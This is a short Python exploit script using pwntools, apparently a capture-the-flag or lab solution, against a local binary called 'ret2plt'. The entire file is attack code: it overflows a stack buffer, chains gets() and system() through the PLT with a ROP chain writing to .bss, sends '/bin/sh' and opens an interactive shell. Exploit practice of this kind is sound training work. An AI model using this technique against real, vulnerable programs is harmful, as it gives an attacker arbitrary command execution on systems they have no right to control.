#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"

e = ELF("./ret2plt")
context.arch = "amd64"
r = process("./ret2plt")

rop = ROP(e)
payload = b"\x00"*0x38
rop.gets(e.bss()+0x100)
rop.system(e.bss()+0x100)
print(rop.dump())
payload = flat(payload, rop)
r.recvline()
r.sendline(payload)
r.sendline("/bin/sh\x00")

r.interactive()
r.close()
